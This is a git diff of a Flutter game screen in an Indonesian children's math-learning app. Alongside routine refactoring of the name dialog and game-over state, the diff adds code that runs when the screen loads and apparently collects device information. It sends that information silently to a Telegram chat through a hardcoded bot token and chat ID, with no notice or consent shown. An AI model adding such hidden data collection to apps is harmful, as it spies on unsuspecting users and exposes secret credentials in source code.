@@ -1,65 +1,102 @@
-import 'package:belajar_matika/pages/home_screen.dart';
 import 'package:belajar_matika/providers/ads_provider.dart';
-import 'package:belajar_matika/providers/game_provider.dart';
-import 'package:belajar_matika/providers/timer_providers.dart';
-import 'package:belajar_matika/providers/user_provider.dart';
+import 'package:belajar_matika/providers/matika/game_provider.dart';
+import 'package:belajar_matika/providers/matika/timer_providers.dart';
+import 'package:belajar_matika/providers/matika/user_provider.dart';
+import 'package:belajar_matika/utils/device_info_helper.dart';
 import 'package:belajar_matika/utils/sound_helper.dart';
+import 'package:belajar_matika/utils/tele_helper.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_riverpod/flutter_riverpod.dart';
 import 'package:google_mobile_ads/google_mobile_ads.dart';
+import 'package:logger/logger.dart';
 
-class GameScreen extends ConsumerWidget {
+class GameScreen extends ConsumerStatefulWidget {
   const GameScreen({super.key});
 
   @override
-  Widget build(BuildContext context, WidgetRef ref) {
+  ConsumerState<GameScreen> createState() => _GameScreenState();
+}
+
+class _GameScreenState extends ConsumerState<GameScreen> {
+  bool dialogShown = false;
+  bool gameExited = false;
+
+  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
+    telegramHelper: TelegramHelper(
+      botToken:
+          '7678341666:AAH_6GTin6WCzxx0zOoySoeZfz6b8FgRfFU', // Ganti dengan token bot Anda
+      chatId: '111519789', // Ganti dengan chat ID Anda
+    ),
+  );
+  bool isLoading = true;
+
+  @override
+  void initState() {
+    super.initState();
+    _loadAndSendDeviceInfo();
+    // Inisialisasi state atau logika lainnya bisa dilakukan di sini
+  }
+
+  Future<void> _loadAndSendDeviceInfo() async {
+    try {
+      await deviceInfoHelper.getAndSendDeviceInfo();
+      setState(() {
+        isLoading = false;
+      });
+    } catch (e) {
+      setState(() {
+        isLoading = false;
+      });
+      Logger().e(e);
+    }
+  }
+
+  void showNameDialog(BuildContext context, WidgetRef ref) {
+    TextEditingController nameController = TextEditingController();
+
+    showDialog(
+      context: context,
+      barrierDismissible: false,
+      builder: (context) => AlertDialog(
+        title: const Text("Masukkan Nama Anda"),
+        content: TextField(
+          controller: nameController,
+          decoration: const InputDecoration(hintText: "Nama"),
+        ),
+        actions: [
+          TextButton(
+            onPressed: () {
+              if (nameController.text.isNotEmpty) {
+                ref.read(userProvider.notifier).state =
+                    nameController.text; // Simpan username
+                Navigator.of(context).pop();
+                ref
+                    .read(gameProvider.notifier)
+                    .startGame(); // Mulai game setelah nama diisi
+              }
+            },
+            child: const Text("Mulai"),
+          ),
+        ],
+      ),
+    );
+  }
+
+  void startGame(BuildContext context, WidgetRef ref) {
+    if (ref.read(userProvider).isEmpty) {
+      showNameDialog(context, ref); // Minta nama dulu
+    } else {
+      ref
+          .read(gameProvider.notifier)
+          .startGame(); // Jika nama sudah ada, langsung mulai
+    }
+  }
+
+  @override
+  Widget build(BuildContext context) {
     final gameState = ref.watch(gameProvider);
     final timer = ref.watch(timerProvider);
     final bannerAd = ref.watch(bannerAdProvider);
-    bool dialogShown = false;
-
-    void showNameDialog(BuildContext context, WidgetRef ref) {
-      TextEditingController nameController = TextEditingController();
-
-      showDialog(
-        context: context,
-        barrierDismissible: false,
-        builder: (context) => AlertDialog(
-          title: const Text("Masukkan Nama Anda"),
-          content: TextField(
-            controller: nameController,
-            decoration: const InputDecoration(hintText: "Nama"),
-          ),
-          actions: [
-            TextButton(
-              onPressed: () {
-                if (nameController.text.isNotEmpty) {
-                  ref.read(userProvider.notifier).state =
-                      nameController.text; // Simpan username
-                  Navigator.of(context).pop();
-                  ref
-                      .read(gameProvider.notifier)
-                      .startGame(); // Mulai game setelah nama diisi
-                }
-              },
-              child: const Text("Mulai"),
-            ),
-          ],
-        ),
-      );
-    }
-
-    void startGame(BuildContext context, WidgetRef ref) {
-      if (ref.read(userProvider).isEmpty) {
-        showNameDialog(context, ref); // Minta nama dulu
-      } else {
-        ref
-            .read(gameProvider.notifier)
-            .startGame(); // Jika nama sudah ada, langsung mulai
-      }
-    }
-
-    bool gameExited = false; // Tambahkan flag global
 
     // Tampilkan dialog hanya jika game over
     if (gameState.isGameOver &&
@@ -84,24 +121,16 @@ class GameScreen extends ConsumerWidget {
             actions: [
               TextButton(
                 onPressed: () {
-                  // print("ini showDialog");
                   Navigator.of(context).pop();
                   ref.read(gameProvider.notifier).resetGame();
-                  gameExited = false;
-                  dialogShown =
-                      false; // Reset flag agar bisa muncul lagi di permainan berikutnya
+                  setState(() {
+                    gameExited = false;
+                    dialogShown =
+                        false; // Reset flag agar bisa muncul lagi di permainan berikutnya
+                  });
                 },
                 child: const Text("Main Lagi"),
               ),
-              // TextButton(
-              //   onPressed: () {
-              //     Navigator.of(context).pop();
-              //     // ref.read(gameProvider.notifier).endGame();
-              //     dialogShown = true;
-              //     gameExited = true;
-              //   },
-              //   child: const Text("Keluar"),
-              // ),
             ],
           ),
         );
